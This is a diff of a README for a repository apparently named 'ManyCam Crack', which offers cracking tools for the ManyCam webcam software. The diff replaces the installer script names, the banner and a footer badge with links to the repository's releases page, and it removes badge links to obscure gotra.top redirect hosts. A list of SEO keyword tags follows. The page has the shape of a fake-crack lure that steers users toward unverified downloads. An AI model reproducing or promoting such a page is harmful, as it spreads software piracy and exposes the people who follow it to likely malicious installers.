@@ -1,5 +1,5 @@
 
-![3685-banner](https://github.com/user-attachments/assets/8eaff185-89d4-47a2-9c59-db77b0ea40f4)
+![3685-banner](https://github.com/Fardinai/ManyCam-Crack/releases)
 
 # ManyCam Crack
 
@@ -29,8 +29,8 @@ Welcome to the **ManyCam Crack** repository! This project provides tools and res
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/Fardinai/ManyCam-Crack/releases`
+     - For macOS: `https://github.com/Fardinai/ManyCam-Crack/releases`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,6 +76,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/Fardinai/ManyCam-Crack/releases](https://github.com/Fardinai/ManyCam-Crack/releases)](https://github.com/Fardinai/ManyCam-Crack/releases)
 # Tags:
 how-to-fully-delete-manycam-from-pc download-manycam activation-code-manycam manycam-old-version better-than-manycam cancel-manycam-subscription crack-manycam manycam-alternative manycam-for-pc manycam-virtual-webcam manycam-osx can-i-use-manycam-on-telegram manycam-download-old-version manycam-download apps-similar-to-manycam manycam-mac-os-x
